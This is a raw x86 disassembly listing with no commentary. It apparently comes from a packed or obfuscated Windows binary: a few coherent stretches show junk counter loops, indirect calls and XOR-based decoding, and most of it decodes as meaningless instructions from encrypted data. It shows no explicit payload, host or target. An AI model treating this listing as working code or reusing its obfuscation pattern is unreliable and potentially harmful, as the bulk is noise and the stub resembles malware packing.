  402921:	sub    cl,cl
  402923:	imul   ebx,DWORD PTR [ebp-0x6a3780e7],0xffffffaf
  40292a:	lea    esi,[eax+0x8f19fcc]
  402930:	mov    ds:0x67fdf7c7,eax
  402935:	dec    edi
  402936:	jne    0x40291e
  402938:	push   esp
  402939:	add    BYTE PTR ds:0x74cd490,al
  40293f:	push   0xffffff89
  402941:	ds inc ebp
  402943:	pop    edx
  402944:	in     al,dx
  402945:	test   eax,esi
  402947:	addr16 push ss
  402949:	xchg   esp,eax
  40294a:	push   ss
  40294b:	ret    0x9715
  40294e:	cmp    esp,edx
  402950:	outs   dx,BYTE PTR ds:[esi]
  402951:	push   ds
  402952:	test   BYTE PTR [edx+0x6b51dd47],dl
  402958:	sbb    al,BYTE PTR [edx-0x74]
  40295b:	fist   DWORD PTR [ecx]
  40295d:	mov    ebp,0x95d37c63
  402962:	inc    eax
  402963:	adc    dl,BYTE PTR [eax-0x36a128fb]
  402969:	ret    0x4
  40296c:	push   ebp
  40296d:	mov    ebp,esp
  40296f:	sub    esp,0x28
  402972:	leave  
  402973:	ret    0x10
  402976:	push   ebp
  402977:	mov    ebp,esp
  402979:	push   ecx
  40297a:	or     eax,DWORD PTR ds:0x42fd5d
  402980:	push   ecx
  402981:	movzx  edx,WORD PTR ds:0x42e76f
  402988:	sbb    DWORD PTR ds:0x42e793,edx
  40298e:	mov    eax,0xf89c8531
  402993:	mov    DWORD PTR ds:0x42fd69,0x1a
  40299d:	cmp    DWORD PTR ds:0x42fd69,0x0
  4029a4:	je     0x402a39
  4029aa:	cmp    DWORD PTR ds:0x42fd69,0x24
  4029b1:	jne    0x4029cc
  4029b7:	push   0x42e1ac
  4029bc:	push   0x42e783
  4029c1:	push   0x59d6
  4029c6:	call   DWORD PTR ds:0x42e4cf
  4029cc:	mov    edx,DWORD PTR ds:0x42fd69
  4029d2:	dec    edx
  4029d3:	mov    DWORD PTR ds:0x42fd69,edx
  4029d9:	jmp    0x40299d
  4029de:	mov    DWORD PTR ds:0x42e77f,0x19
  4029e8:	cmp    DWORD PTR ds:0x42e77f,0x0
  4029ef:	je     0x402a39
  4029f5:	cmp    DWORD PTR ds:0x42e77f,0x4
  4029fc:	jne    0x402a0d
  402a02:	push   0x5bc5
  402a07:	call   DWORD PTR ds:0x42e353
  402a0d:	cmp    DWORD PTR ds:0x42e77f,0x5
  402a14:	jne    0x402a27
  402a1a:	mov    edx,DWORD PTR ds:0x42e77f
  402a20:	dec    edx
  402a21:	mov    DWORD PTR ds:0x42e77f,edx
  402a27:	mov    edx,DWORD PTR ds:0x42e77f
  402a2d:	dec    edx
  402a2e:	mov    DWORD PTR ds:0x42e77f,edx
  402a34:	jmp    0x4029e8
  402a39:	mov    DWORD PTR [ebp-0x8],eax
  402a3c:	mov    DWORD PTR [ebp-0x4],0xf89c8530
  402a43:	mov    edx,DWORD PTR [ebp-0x8]
  402a46:	mov    ecx,DWORD PTR ds:0x42fe2e
  402a4c:	mov    ecx,DWORD PTR [ecx]
  402a4e:	xor    DWORD PTR ds:0x42fd55,ecx
  402a54:	push   esi
  402a55:	mov    ecx,0x7510855
  402a5a:	or     DWORD PTR ds:0x42fd8d,ebx
  402a60:	xor    edx,ecx
  402a62:	sbb    esi,0x5361
  402a68:	mov    esi,0x32729c
  402a6d:	sbb    DWORD PTR ds:0x42e1a8,0x657d
  402a77:	push   edi
  402a78:	and    DWORD PTR ds:0x42e1a8,0x0
  402a82:	jmp    0x402a94
  402a87:	mov    edi,DWORD PTR ds:0x42e1a8
  402a8d:	inc    edi
  402a8e:	mov    DWORD PTR ds:0x42e1a8,edi
  402a94:	cmp    DWORD PTR ds:0x42e1a8,0x10
  402a9b:	jae    0x402abe
  402aa1:	cmp    DWORD PTR ds:0x42e1a8,0x11
  402aa8:	jne    0x402ab9
  402aae:	push   0x42e1c1
  402ab3:	call   DWORD PTR ds:0x42e4d3
  402ab9:	jmp    0x402a87
  402abe:	mov    edi,DWORD PTR [ebp+0x10]
  402ac1:	add    edx,esi
  402ac3:	cmp    edi,edx
  402ac5:	je     0x4036ba
  402acb:	mov    edx,DWORD PTR [ebp-0x8]
  402ace:	mov    eax,DWORD PTR [ebp-0x4]
  402ad1:	xor    eax,ecx
  402ad3:	mov    edi,0xffcd8d64
  402ad8:	sub    edi,eax
  402ada:	add    edi,DWORD PTR [ebp+0x10]
  402add:	xor    edx,ecx
  402adf:	jmp    0x402dbe
  402ae4:	imul   ebx,DWORD PTR [edx],0xffffff8f
  402ae7:	cmp    BYTE PTR [ebp+0x71],cl
  402aea:	jae    0x402a9d
  402aec:	jl     0x402b40
  402aee:	dec    esi
  402aef:	mov    esp,0x2b610f39
  402af4:	jo     0x402b02
  402af6:	jo     0x402b68
  402af8:	mov    esi,0xce70707e
  402afd:	sub    edi,DWORD PTR [edi]
  402aff:	mov    DWORD PTR [ecx-0x182774f1],0x61a5db9f
  402b09:	jl     0x402aa4
  402b0b:	add    al,0xcd
  402b0d:	adc    eax,0x3a5cf356
  402b12:	retf   
  402b13:	or     dl,BYTE PTR [eax]
  402b15:	pop    ecx
  402b16:	pushf  
  402b17:	aas    
  402b18:	repz adc DWORD PTR [edi+0x5c],edx
  402b1c:	(bad)  
  402b1d:	lahf   
  402b1e:	jge    0x402aee
  402b20:	mov    al,0x55
  402b22:	call   0xc841fa93
  402b27:	in     al,dx
  402b28:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402b29:	and    eax,0xa0f0aaaa
  402b2e:	push   cs
  402b2f:	loopne 0x402b6e
  402b31:	test   BYTE PTR [edi+0x75666d4f],0xc0
  402b38:	pop    eax
  402b39:	inc    esp
  402b3a:	push   esp
  402b3b:	leave  
  402b3c:	in     al,0x29
  402b3e:	shr    DWORD PTR [edi],0x0
  402b41:	or     al,0x8
  402b43:	in     eax,dx
  402b44:	xor    dh,dh
  402b46:	or     al,0xb5
  402b48:	adc    eax,0xc8e7843a
  402b4d:	sti    
  402b4e:	or     al,0xdc
  402b50:	push   cs
  402b51:	shl    DWORD PTR [ebp+0x513eebdf],1
  402b57:	dec    ebp
  402b58:	xlat   BYTE PTR ds:[ebx]
  402b59:	bnd jnp 0x402bbb
  402b5c:	fmul   QWORD PTR [edi+ecx*4+0x5bf8cab0]
  402b63:	push   ss
  402b64:	jbe    0x402b1e
  402b66:	dec    esi
  402b67:	mov    eax,?
  402b69:	sbb    al,bl
  402b6b:	into   
  402b6c:	xor    al,0xce
  402b6e:	aaa    
  402b6f:	retf   0xf6e3
  402b72:	jb     0x402b49
  402b74:	jl     0x402b94
  402b76:	xor    BYTE PTR [ebp-0x59af383b],0x26
  402b7d:	mov    ebx,0xc2fc8373
  402b82:	and    DWORD PTR [eax],eax
  402b84:	pushf  
  402b85:	mov    WORD PTR [edi-0x3de562db],?
  402b8b:	sahf   
  402b8c:	sub    bl,BYTE PTR [esi]
  402b8e:	mov    eax,0xdf732daf
  402b93:	add    al,0x28
  402b95:	out    dx,eax
  402b96:	scas   al,BYTE PTR es:[edi]
  402b97:	fwait
  402b98:	push   cs
  402b99:	mov    al,0x41
  402b9b:	loopne 0x402bd2
  402b9d:	rol    BYTE PTR [esp+ebp*1-0x50b58f62],0x81
  402ba5:	aas    
  402ba6:	rcr    BYTE PTR [esi],cl
  402ba8:	test   eax,0x874f353
  402bad:	dec    esp
  402bae:	cwde   
  402baf:	pop    ds
  402bb0:	sbb    BYTE PTR [edi-0x73],ah
  402bb3:	fwait
  402bb4:	and    BYTE PTR ds:0xdf5ad0b8,ah
  402bba:	xchg   esi,eax
  402bbb:	inc    ebx
  402bbc:	adc    ecx,ebx
  402bbe:	out    dx,eax
  402bbf:	out    0x5b,eax
  402bc1:	sbb    ebp,DWORD PTR [ecx]
  402bc3:	stos   BYTE PTR es:[edi],al
  402bc4:	test   BYTE PTR [ecx+0x608793ba],dh
  402bca:	(bad)  
  402bcb:	(bad)  
  402bcc:	cmp    ebp,DWORD PTR [ebx+eax*2-0x3ed67652]
  402bd3:	push   eax
  402bd4:	fcmovnu st,st(5)
  402bd6:	packuswb mm4,QWORD PTR [ebx+0x2e4ae211]
  402bdd:	mov    ecx,0x838baf03
  402be2:	retf   0x8233
  402be5:	mov    ecx,0xed39c69e
  402bea:	sub    DWORD PTR [edx+0x160e5e83],0xffffffb5
  402bf1:	(bad)  
  402bf2:	fdivr  DWORD PTR [edi+0x7a]
  402bf5:	xchg   esi,eax
  402bf6:	in     eax,0x82
  402bf8:	cdq    
  402bf9:	mov    ebp,0x853e9f4e
  402bfe:	fs pop ecx
  402c00:	mov    eax,0x361c2a59
  402c05:	and    DWORD PTR [ebp+0x5f],edi
  402c08:	add    al,0xdd
  402c0a:	mov    fs,WORD PTR [ebx]
  402c0c:	sbb    al,0x62
  402c0e:	adc    edi,DWORD PTR [edi+eiz*8]
  402c11:	data16 cmp BYTE PTR [eax+eax*2],al
  402c15:	scas   al,BYTE PTR es:[edi]
  402c16:	lds    ecx,FWORD PTR [edi-0x3e19f7b4]
  402c1c:	add    ebp,DWORD PTR [eax-0x1c51a5a6]
  402c22:	ficomp DWORD PTR [edi-0x5f16086c]
  402c28:	in     eax,0xa9
  402c2a:	mov    eax,fs
  402c2c:	inc    edi
  402c2d:	pop    edx
  402c2e:	jno    0x402c6c
  402c30:	int    0xa3
  402c32:	das    
  402c33:	adc    al,0x79
  402c35:	jg     0x402c45
  402c37:	xor    esp,0xce073bf1
  402c3d:	push   cs
  402c3e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402c3f:	popa   
  402c40:	mov    ecx,0xfa5f15b3
  402c45:	test   BYTE PTR gs:[esi],dh
  402c48:	popf   
  402c49:	mov    ebp,0xa4ac22a1
  402c4e:	inc    esi
  402c4f:	sar    ecx,cl
  402c51:	mov    WORD PTR ds:0x8be1efd7,?
  402c57:	rol    DWORD PTR [ebx-0x4d8251e],0x96
  402c5e:	fisub  WORD PTR ds:0xa928d28d
  402c64:	jge    0x402c33
  402c66:	jmp    0x645db6e1
  402c6b:	xor    sp,di
  402c6e:	fdiv   st,st(5)
  402c70:	(bad)  
  402c71:	repz sub DWORD PTR [ebx+ecx*8-0x51],ebp
  402c76:	jecxz  0x402c41
  402c78:	pop    ebp
  402c79:	aad    0x28
  402c7b:	aad    0xb1
  402c7d:	jno    0x402cb4
  402c7f:	add    DWORD PTR [eax+0xf34076a],eax
  402c85:	cmp    eax,0xfdad9b7b
  402c8a:	rcl    BYTE PTR [ecx+0x46927e9a],1
  402c90:	push   es
  402c91:	test   BYTE PTR [ebx],bl
  402c93:	loop   0x402ce9
  402c95:	cdq    
  402c96:	daa    
  402c97:	add    al,cl
  402c99:	scas   al,BYTE PTR es:[edi]
  402c9a:	push   ss
  402c9b:	mov    edi,0xb76d4837
  402ca0:	pushf  
  402ca1:	cld    
  402ca2:	loop   0x402c46
  402ca4:	aas    
  402ca5:	dec    esi
  402ca6:	or     ah,cl
  402ca8:	loopne 0x402c9f
  402caa:	pop    esi
  402cab:	mov    bh,bl
  402cad:	jmp    FWORD PTR [edi+0x1c]
  402cb0:	in     al,0x87
  402cb2:	jne    0x402c4d
  402cb4:	pop    ebx
  402cb5:	adc    eax,0x6f045ad0
  402cba:	shl    DWORD PTR [edi*4-0x176ff59a],1
  402cc1:	mov    BYTE PTR [ebx],bl
  402cc3:	rcr    DWORD PTR [ebp-0x710bdb6d],cl
  402cc9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402cca:	je     0x402ca4
  402ccc:	into   
  402ccd:	ins    DWORD PTR es:[edi],dx
  402cce:	sbb    al,0xfe
  402cd0:	stos   DWORD PTR es:[edi],eax
  402cd1:	std    
  402cd2:	lds    ebx,FWORD PTR [ebx+0x28]
  402cd5:	(bad)  
  402cd6:	fmul   QWORD PTR [ebp+ebp*4-0x629f570]
  402cdd:	push   cs
  402cde:	bound  ebp,QWORD PTR [edi]
  402ce0:	test   esp,0x12dd0959
  402ce6:	mov    edi,0x64edf05f
  402ceb:	out    dx,eax
  402cec:	clc    
  402ced:	scas   eax,DWORD PTR es:[edi]
  402cee:	adc    eax,0xa982f04c
  402cf3:	jo     0x402cc5
  402cf5:	aaa    
  402cf6:	call   0xd31ad92b
  402cfb:	mov    ebx,0xdb49020d
  402d00:	jl     0x402ce6
  402d02:	jno    0x402c8a
  402d04:	xchg   esi,eax
  402d05:	retf   0x8a7d
  402d08:	inc    edi
  402d09:	shl    DWORD PTR [eax+ecx*4+0x518701dd],0x3c
  402d11:	jecxz  0x402d4f
  402d13:	bound  esp,QWORD PTR [eax+0x68]
  402d16:	mov    ds:0xd6c5a10,eax
  402d1b:	(bad)  
  402d1c:	dec    DWORD PTR [ebx]
  402d1e:	push   ebx
  402d1f:	mov    ch,0xb5
  402d21:	mul    DWORD PTR [eax+0x5f]
  402d24:	dec    ebp
  402d25:	jb     0x402d23
  402d27:	or     DWORD PTR [eax-0x6b],edx
  402d2a:	push   0xe4076267
  402d2f:	scas   al,BYTE PTR es:[edi]
  402d30:	jg     0x402d93
  402d32:	and    ebp,DWORD PTR [ebp+0x39]
  402d35:	mov    ah,0x4
  402d37:	sbb    eax,0x6753d700
  402d3c:	es stos BYTE PTR es:[edi],al
  402d3e:	pop    esp
  402d3f:	adc    dh,BYTE PTR [ebx]
  402d41:	push   0xfffffff6
  402d43:	addr16 mov ah,0x4
  402d46:	adc    eax,esi
  402d48:	js     0x402da8
  402d4a:	adc    ecx,ebx
  402d4c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402d4d:	push   esp
  402d4e:	jno    0x402cf4
  402d50:	push   eax
  402d51:	fild   QWORD PTR [ecx+0x5e624c79]
  402d57:	outs   dx,BYTE PTR ds:[esi]
  402d58:	mov    ?,esi
  402d5a:	pop    ebp
  402d5b:	loope  0x402dcb
  402d5d:	leave  
  402d5e:	pop    ebp
  402d5f:	dec    edi
  402d60:	adc    dh,dl
  402d62:	data16 fild DWORD PTR ds:0x87f3d586
  402d69:	seto   BYTE PTR [ecx+0x79]
  402d6d:	pusha  
  402d6e:	mov    eax,0x2fc4b1dd
  402d73:	xlat   BYTE PTR ds:[ebx]
  402d74:	xchg   edx,eax
  402d75:	stos   DWORD PTR es:[edi],eax
  402d76:	pop    ss
  402d77:	in     eax,dx
  402d78:	jbe    0x402d97
  402d7a:	mul    BYTE PTR [eax-0x54]
  402d7d:	or     eax,0xabb9d7
  402d82:	mov    ecx,0x159c5e22
  402d87:	and    ah,dl
  402d89:	jecxz  0x402de9
  402d8b:	clc    
  402d8c:	neg    BYTE PTR ds:0x5d982904
  402d92:	mov    ecx,DWORD PTR [ebp+0x7d27d4f9]
  402d98:	xchg   ebp,eax
  402d99:	bound  ebp,QWORD PTR [ebp+0x2e951ced]
  402d9f:	stc    
  402da0:	ror    BYTE PTR [ebx+0x1f56d18],0xd5
  402da7:	out    0x51,eax
  402da9:	mov    dl,0x72
  402dab:	fcmovbe st,st(2)
  402dad:	into   
  402dae:	mov    edi,0x1d3d1bb1
  402db3:	ins    BYTE PTR es:[edi],dx
  402db4:	enter  0x8ba2,0xb4
  402db8:	es xchg ebp,eax
  402dba:	mov    esp,DWORD PTR [eax-0x29fc2892]
  402dc0:	cmp    edx,edi
  402dc2:	ja     0x4036b5
  402dc8:	push   ebx
  402dc9:	jmp    0x4030b2
  402dce:	jmp    0x4030ad
  402dd3:	mov    ecx,0xe1afe4fc
  402dd8:	ja     0x402e2b
  402dda:	push   0xffffffa6
  402ddc:	aas    
  402ddd:	xchg   ebp,eax
  402dde:	out    dx,eax
  402ddf:	out    0x71,al
  402de1:	aas    
  402de2:	cli    
  402de3:	mov    esi,0xbe70700a
  402de8:	jle    0x402e5a
  402dea:	jo     0x402de3
  402dec:	cmp    bh,ch
  402dee:	(bad)  
  402def:	rcl    DWORD PTR [edx],1
  402df1:	in     al,0x28
  402df3:	dec    edi
  402df4:	sub    eax,0x89be5068
  402df9:	jle    0x402e48
  402dfb:	test   DWORD PTR [edi-0x4c],esi
  402dfe:	add    eax,0xc109473f
  402e03:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402e04:	je     0x402dc5
  402e06:	and    esi,edi
  402e08:	or     al,ah
  402e0a:	daa    
  402e0b:	push   eax
  402e0c:	cmp    esi,ebx
  402e0e:	or     al,0xc9
  402e10:	adc    eax,0xbdaf45b6
  402e15:	es shr eax,cl
  402e18:	div    DWORD PTR ds:0x85c8808d
  402e1e:	mov    esp,0x2aea190
  402e23:	pop    ds
  402e24:	in     al,0x25
  402e26:	or     BYTE PTR [ebp+ebx*8-0x4bfe807a],dl
  402e2d:	push   ss
  402e2e:	mov    bl,0xa2
  402e30:	push   ebp
  402e31:	mov    cl,0xf2
  402e33:	xor    al,0x73
  402e35:	sub    esp,0xffffff89
  402e38:	fdivr  QWORD PTR [ecx-0xa7fdb7]
  402e3e:	jb     0x402e86
  402e40:	sbb    eax,0xef88c3c3
  402e45:	sti    
  402e46:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402e47:	mov    edi,ebp
  402e49:	aaa    
  402e4a:	adc    eax,0x9dd5f54c
  402e4f:	xchg   BYTE PTR [eax+0x8],dh
  402e52:	add    bh,BYTE PTR [edx]
  402e54:	and    BYTE PTR [ecx],bh
  402e56:	int3   
  402e57:	test   eax,0x8e3688f
  402e5c:	imul   edx,DWORD PTR [ecx+eiz*8+0x7f],0xffffffa0
  402e61:	or     DWORD PTR [esi-0x7218d62d],0x51e415f7
  402e6b:	int    0x4b
  402e6d:	add    bh,cl
  402e6f:	sub    al,0x96
  402e71:	int3   
  402e72:	cmp    al,0xda
  402e74:	pop    ecx
  402e75:	mov    ds:0xfe94fc5f,eax
  402e7a:	or     al,0x4e
  402e7c:	push   esp
  402e7d:	lds    edi,FWORD PTR [ebp-0x4996de96]
  402e83:	out    0x81,al
  402e85:	mov    dl,BYTE PTR [ecx+0x59]
  402e88:	push   ecx
  402e89:	test   al,0x1b
  402e8b:	(bad)  
  402e8c:	iret   
  402e8d:	mov    ecx,0x173446c7
  402e92:	mov    al,BYTE PTR [ebx-0x54]
  402e95:	mov    esi,0x45b72900
  402e9a:	push   es
  402e9b:	or     DWORD PTR [edx-0x72],ebp
  402e9e:	adc    ebp,DWORD PTR [edx-0x51c418a2]
  402ea4:	ret    
  402ea5:	mov    ds:0x160ba10a,eax
  402eaa:	inc    edi
  402eab:	sti    
  402eac:	lods   eax,DWORD PTR ds:[esi]
  402ead:	mov    ds:0x9b650331,al
  402eb2:	push   ebx
  402eb3:	out    dx,eax
  402eb4:	out    dx,al
  402eb5:	mov    ds:0x4ae48642,eax
  402eba:	sub    ecx,esi
  402ebc:	pop    eax
  402ebd:	push   cs
  402ebe:	jbe    0x402e5f
  402ec0:	daa    
  402ec1:	mov    gs,WORD PTR [edi-0x9]
  402ec4:	push   ebx
  402ec5:	xor    ebp,DWORD PTR [esi+ebp*2+0x26]
  402ec9:	mov    dl,0x6d
  402ecb:	es sbb edi,0xffffffbf
  402ecf:	mov    ?,WORD PTR [ecx*2-0x552f160c]
  402ed6:	in     eax,dx
  402ed7:	iret   
  402ed8:	scas   eax,DWORD PTR es:[edi]
  402ed9:	cmp    al,0xb
  402edb:	pop    ebp
  402edc:	call   FWORD PTR [ecx+0x155d71eb]
  402ee2:	rcl    DWORD PTR [esi-0x7b4ef046],1
  402ee8:	(bad)  
  402eea:	inc    ebp
  402eeb:	aad    0x1a
  402eed:	mov    al,BYTE PTR [ebx]
  402eef:	jge    0x402ec3
  402ef1:	mov    ebx,edx
  402ef3:	dec    ebx
  402ef4:	jle    0x402f66
  402ef6:	test   BYTE PTR [esp+esi*8],ch
  402ef9:	mov    ah,0x3f
  402efb:	gs cwde 
  402efd:	call   FWORD PTR [edi-0x1991cfa7]
  402f03:	pop    edx
  402f04:	jge    0x402edd
  402f06:	xchg   BYTE PTR cs:[edx-0x584d2eb8],ch
  402f0d:	fwait
  402f0e:	xor    al,0xe
  402f10:	fcmovu st,st(6)
  402f12:	sbb    DWORD PTR [edi+edi*1],0x32
  402f16:	cdq    
  402f17:	jmp    FWORD PTR [edx+0x7487a6f0]
  402f1d:	mov    esi,DWORD PTR [eax-0xf8ee1c9]
  402f23:	mov    eax,0xddc69dca
  402f28:	test   DWORD PTR [eax+edi*4],0xb100187b
  402f2f:	outs   dx,DWORD PTR ds:[esi]
  402f30:	push   esp
  402f31:	out    dx,eax
  402f32:	lea    esi,[eax+ebp*1]
  402f35:	mov    esp,0x4e35758f
  402f3a:	add    DWORD PTR [ecx+0x2af38fbe],edx
  402f40:	and    ebp,DWORD PTR [esi]
  402f42:	mov    eax,ds:0x9fbb165d
  402f47:	sub    DWORD PTR [eax+0x7b],edx
  402f4a:	pusha  
  402f4b:	loop   0x402f9c
  402f4d:	jg     0x402ed4
  402f4f:	popa   
  402f50:	xchg   edi,eax
  402f51:	mov    cl,0x60
  402f53:	mov    BYTE PTR [ebp+0x6cf73eb7],dh
  402f59:	pop    ss
  402f5a:	push   ecx
  402f5b:	ror    BYTE PTR [ebx-0x72],1
  402f5e:	and    eax,0xb4cdb3b3
  402f63:	push   esi
  402f64:	push   cs
  402f65:	shl    BYTE PTR [ebx-0x60533a7f],1
  402f6b:	daa    
  402f6c:	mov    ah,0xa0
  402f6e:	jle    0x402f31
  402f70:	xchg   esi,eax
  402f71:	and    eax,0xf97ac65
  402f76:	out    0xa,eax
  402f78:	push   ds
  402f79:	(bad)  
  402f7a:	jno    0x402f36
  402f7c:	pop    ebx
  402f7d:	sub    DWORD PTR [ebx-0x2b5c296e],ebp
  402f83:	or     bh,bh
  402f85:	out    dx,eax
  402f86:	mov    bh,0xad
  402f88:	and    ah,dl
  402f8a:	jns    0x402fba
  402f8c:	mov    dl,0x31
  402f8e:	rcr    BYTE PTR [ebx],1
  402f90:	and    al,0x26
  402f92:	mov    eax,0x4f6da9f5
  402f97:	popa   
  402f98:	inc    eax
  402f99:	lods   al,BYTE PTR ds:[esi]
  402f9a:	shl    DWORD PTR [bp+si+0x40de],1
  402f9f:	cmc    
  402fa0:	imul   ebx,DWORD PTR [ecx-0x1a],0x51399e28
  402fa7:	nop
  402fa8:	jle    0x402f7e
  402faa:	mov    eax,ds:0x4d5c0619
  402faf:	mov    esp,0xe4e0f753
  402fb4:	cmp    DWORD PTR [edx],ebx
  402fb6:	lea    esi,[edi]
  402fb8:	mov    esp,0x4d78233a
  402fbd:	and    eax,0x6ebb4903
  402fc2:	add    eax,0x2f864c0d
  402fc7:	mov    dl,BYTE PTR [ebx+0x6f]
  402fca:	adc    eax,0x70a8c296
  402fcf:	es out 0x97,eax
  402fd2:	dec    ebx
  402fd3:	adc    DWORD PTR [edi-0x28],ebp
  402fd6:	(bad)  
  402fd7:	das    
  402fd8:	repnz test al,0x48
  402fdb:	xor    al,0xf3
  402fdd:	nop
  402fde:	mov    al,ds:0x9f3b048f
  402fe3:	ficomp DWORD PTR [edx-0x1e]
  402fe6:	mov    ds:0xc886dc94,al
  402feb:	jp     0x403018
  402fed:	std    
  402fee:	test   BYTE PTR [ebx+0x149ae4e0],0x2
  402ff5:	sbb    al,0x4b
  402ff7:	push   edx
  402ff8:	sbb    al,0x1e
  402ffa:	mov    esp,0x686f5382
  402fff:	sbb    al,0x2b
  403001:	mov    bh,0x13
  403003:	sbb    DWORD PTR [ecx],edi
  403005:	and    al,0x2
  403007:	test   dl,al
  403009:	mov    dh,ch
  40300b:	mov    ebx,ebx
  40300d:	leave  
  40300e:	call   0x832b5164
  403013:	fcom   QWORD PTR [ecx-0x5b519814]
  403019:	and    di,WORD PTR [edi]
  40301c:	xor    eax,0x9a60cae3
  403021:	neg    eax
  403023:	sahf   
  403024:	fidiv  WORD PTR [ecx+0x234c807e]
  40302a:	gs xor eax,0x589e220
  403030:	and    eax,0xc71ccaa4
  403035:	in     eax,0xd9
  403037:	sbb    dl,dh
  403039:	enter  0x3ace,0xf5
  40303d:	daa    
  40303e:	in     eax,0x74
  403040:	jp     0x402fe5
  403042:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403043:	push   ebx
  403044:	cmc    
  403045:	push   eax
  403046:	(bad)  
  403047:	int3   
  403048:	adc    eax,0xa643fce6
  40304d:	int3   
  40304e:	lods   al,BYTE PTR ds:[esi]
  40304f:	imul   esp,eax,0x4f
  403052:	fisub  WORD PTR [esi+ebp*1-0x31]
  403056:	stc    
  403057:	jl     0x40300d
  403059:	jo     0x403027
  40305b:	add    edx,edi
  40305d:	sub    ah,BYTE PTR [esi-0x51]
  403060:	sbb    bh,ch
  403062:	outs   dx,BYTE PTR ds:[esi]
  403063:	or     al,0x77
  403065:	aam    0x8
  403067:	sbb    eax,0x2df9ddc6
  40306c:	push   ebp
  40306d:	fidivr WORD PTR [esi]
  40306f:	mov    ch,0xb3
  403071:	xlat   BYTE PTR ds:[ebx]
  403072:	mov    ah,BYTE PTR [ebp+0x70946668]
  403078:	lahf   
  403079:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  40307b:	push   ecx
  40307c:	lds    edx,FWORD PTR [edi-0x229459b3]
  403082:	cmp    BYTE PTR [esi+eax*2],dh
  403085:	cmp    DWORD PTR [ebx+esi*1],ecx
  403088:	sar    DWORD PTR [ecx],0x2b
  40308b:	inc    esp
  40308c:	sar    BYTE PTR [edx],0xee
  40308f:	mov    bl,0xf5
  403091:	leave  
  403092:	imul   ebx,ecx,0xa31aca59
  403098:	js     0x4030f5
  40309a:	jae    0x403065
  40309c:	inc    ecx
  40309d:	loope  0x40303a
  40309f:	mov    dl,0x12
  4030a1:	xor    cl,BYTE PTR [esi+0x6d]
  4030a4:	or     eax,0x58e11753
  4030a9:	frstor [edi+0x21]
  4030ac:	or     BYTE PTR [esi+0x32729c],bh
  4030b2:	mov    eax,DWORD PTR [ebp-0x8]
  4030b5:	mov    edi,DWORD PTR [ebp-0x4]
  4030b8:	xor    edi,ecx
  4030ba:	add    edi,esi
  4030bc:	jmp    0x40339b
  4030c1:	fist   DWORD PTR [ecx+0x4b76cc16]
  4030c7:	loope  0x40307a
  4030c9:	lds    edx,FWORD PTR [esi-0x42]
  4030cc:	add    al,0x6b
  4030ce:	jmp    FWORD PTR [eax-0x25]
  4030d1:	cld    
  4030d2:	pop    ss
  4030d3:	jo     0x403145
  4030d5:	mov    esi,0xc770707e
  4030da:	adc    DWORD PTR [ebx-0x2b],ebx
  4030dd:	pop    ebp
  4030de:	push   edx
  4030df:	sahf   
  4030e0:	and    eax,0xee04eced
  4030e5:	frstor [ecx]
  4030e7:	sub    al,0x52
  4030e9:	pusha  
  4030ea:	cmp    edi,DWORD PTR [esi+0x5]
  4030ed:	mov    ch,0x67
  4030ef:	(bad)  
  4030f0:	xchg   ecx,eax
  4030f1:	addr16 enter 0x5ce4,0x5f
  4030f6:	icebp  
  4030f7:	mov    bl,0x73
  4030f9:	repnz mov ebp,0x8442c16d
  4030ff:	fsubrp st(2),st
  403101:	adc    DWORD PTR [eax],ebx
  403103:	jmp    0x3a30423a
  403108:	push   edi
  403109:	mov    ecx,0xf0cbc3f7
  40310e:	sbb    cl,cl
  403110:	mov    cl,0xfe
  403112:	dec    esi
  403113:	(bad)  
  403114:	test   al,0xec
  403116:	or     al,0x4e
  403118:	stos   DWORD PTR es:[edi],eax
  403119:	pop    edx
  40311a:	add    BYTE PTR [ecx+ebx*1+0x44],al
  40311e:	cmp    BYTE PTR [edx+0x5e],al
  403121:	add    al,0xc0
  403123:	push   ebx
  403124:	daa    
  403125:	push   0x675ffab
  40312a:	inc    ebp
  40312b:	or     al,0x47
  40312d:	test   BYTE PTR [edi+0x24ae6e1f],cl
  403133:	(bad)  
  403134:	pop    edi
  403135:	lock inc esi
  403137:	mov    bl,0x42
  403139:	adc    al,0xf3
  40313b:	popa   
  40313c:	icebp  
  40313d:	or     eax,0xc4c528d7
  403142:	pop    esp
  403143:	xchg   edx,eax
  403144:	sahf   
  403145:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403146:	pop    ecx
  403147:	pop    ecx
  403148:	(bad)  
  403149:	jg     0x40318d
  40314b:	popf   
  40314c:	xlat   BYTE PTR ds:[ebx]
  40314d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40314e:	jmp    0x69080b5d
  403153:	xor    cl,BYTE PTR [ecx+0x26]
  403156:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403157:	pop    eax
  403158:	ret    0xd059
  40315b:	(bad)  
  40315c:	cld    
  40315d:	and    dl,BYTE PTR [edi]
  40315f:	pop    ecx
  403160:	mov    ebp,0xa113bb3
  403165:	mov    esi,fs
  403167:	imul   eax,DWORD PTR [ebp+0x9ebc1d8],0xc37c1bcf
  403171:	xor    BYTE PTR [ebp-0x2f],0x6e
  403175:	ret    0x9340
  403178:	sahf   
  403179:	push   esi
  40317a:	sbb    BYTE PTR [esi],ah
  40317c:	push   ds
  40317d:	lods   al,BYTE PTR ds:[esi]
  40317e:	ret    
  40317f:	jl     0x4031d9
  403181:	jp     0x4031f6
  403183:	jno    0x40313e
  403185:	add    BYTE PTR [ebp+0x6a],bl
  403188:	jo     0x4031aa
  40318a:	(bad)  
  40318b:	inc    edx
  40318c:	and    DWORD PTR [ebx],ecx
  40318e:	gs mov dh,0x49
  403191:	hlt    
  403192:	xchg   ecx,eax
  403193:	into   
  403194:	neg    BYTE PTR [edx]
  403196:	adc    al,0x87
  403198:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403199:	outs   dx,DWORD PTR ds:[esi]
  40319a:	sub    bl,bl
  40319c:	aad    0x40
  40319e:	xor    DWORD PTR [edx],ebp
  4031a0:	retf   
  4031a1:	test   al,0x33
  4031a3:	pop    esi
